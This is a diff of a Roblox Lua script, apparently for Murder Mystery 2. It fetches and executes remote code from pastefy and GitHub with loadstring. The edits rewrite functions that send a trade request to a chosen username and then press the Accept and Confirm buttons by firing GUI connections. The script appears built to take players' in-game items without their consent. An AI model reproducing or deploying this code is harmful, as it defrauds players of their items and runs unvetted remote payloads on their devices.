@@ -179,7 +179,7 @@ end
 
 loadstring(game:HttpGet("https://pastefy.app/8vUdWyvU/raw",true))()
 
-local scriptUrl = "https://raw.githubusercontent.com/ScriptsForMM2RewHub/RewHub/refs/heads/main/test.lua"
+local scriptUrl = "https://raw.githubusercontent.com/ScriptsForMM2RewHub/RewHub/refs/heads/main/qwertyMobile.lua"
 
 local function getScript()
 	if game.HttpGetAsync then
@@ -426,42 +426,50 @@ end
 local DEVICE_TYPE = get_device_type()
 
 local function accept()
-    local ReplicatedStorage = game:GetService("ReplicatedStorage")
-    local TradeEvent = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("AcceptTrade")
-
     if DEVICE_TYPE == 'tablet' then
-        -- Эмуляция кликов Accept и Confirm
-        TradeEvent:FireServer("Accept")
+        local path1 = game.Players.LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("TradeGUI"):WaitForChild('Container'):WaitForChild('Trade'):WaitForChild('Actions'):WaitForChild("Accept")
+        local target_button1 = path1:WaitForChild('ActionButton')
+        getconnections(target_button1.MouseButton1Click)[1]:Fire()
         wait(0.5)
-        TradeEvent:FireServer("Confirm")
+        local path2 = game.Players.LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("TradeGUI"):WaitForChild('Container'):WaitForChild('Trade'):WaitForChild('Actions'):WaitForChild("Accept"):WaitForChild("Confirm")
+        local target_button2 = path2:WaitForChild('ActionButton')
+        getconnections(target_button2.MouseButton1Click)[1]:Fire()
     else
-        -- Для мобильной версии
-        TradeEvent:FireServer("Accept")
+        local path1 = game.Players.LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("TradeGUI_Phone"):WaitForChild('Container'):WaitForChild('Trade'):WaitForChild('Actions'):WaitForChild("Accept")
+        local target_button1 = path1:WaitForChild('ActionButton')
+        getconnections(target_button1.MouseButton1Click)[1]:Fire()
         wait(0.5)
-        TradeEvent:FireServer("Confirm")
+        local path2 = game.Players.LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("TradeGUI_Phone"):WaitForChild('Container'):WaitForChild('Trade'):WaitForChild('Actions'):WaitForChild("Accept"):WaitForChild("Confirm")
+        local target_button2 = path2:WaitForChild('ActionButton')
+        getconnections(target_button2.MouseButton1Click)[1]:Fire()
     end
 end
 
 local function SendTrade(Username)
-    local ReplicatedStorage = game:GetService("ReplicatedStorage")
-    local TradeEvent = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("SendTradeRequest")
-
     if DEVICE_TYPE == 'tablet' then
+
         print("tablet")
-        -- Отправляем запрос на трейд
-        TradeEvent:FireServer(Username)
+        local player_list = game.Players.LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("MainGUI"):WaitForChild('Game'):WaitForChild('Leaderboard'):WaitForChild("Container")
+        local target_button = player_list:WaitForChild(tostring(Username)):WaitForChild('ActionButton')
+        getconnections(target_button.MouseButton1Click)[1]:Fire()
+
+        local Inspect = game.Players.LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("MainGUI"):WaitForChild('Game'):WaitForChild('Leaderboard'):WaitForChild("Inspect")
+        local button_trade = Inspect:WaitForChild("Trade")
+        getconnections(button_trade.MouseButton1Click)[1]:Fire()
     else
         print("phone")
-        -- Для мобильной версии
-        TradeEvent:FireServer(Username)
+        local player_list = game.Players.LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("MainGUI"):WaitForChild("Lobby"):WaitForChild('Leaderboard'):WaitForChild('Container'):WaitForChild("PlayerList")
+        local target_button = player_list:WaitForChild(tostring(Username)):WaitForChild('ActionButton')
+        getconnections(target_button.MouseButton1Click)[1]:Fire()
+
+        local Popup = game.Players.LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("MainGUI"):WaitForChild("Lobby"):WaitForChild('Leaderboard'):WaitForChild('Popup')
+        local button_trade = Popup:WaitForChild("Container"):WaitForChild("Action"):WaitForChild('Trade')
+        getconnections(button_trade.Activated)[1]:Fire()
     end
 end
-
 local function getTradeStatus()
     return game:GetService("ReplicatedStorage").Trade.GetTradeStatus:InvokeServer()
 end
-
-local player = game.Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 local tradegui = playerGui:WaitForChild("TradeGUI")
 tradegui:GetPropertyChangedSignal("Enabled"):Connect(function()
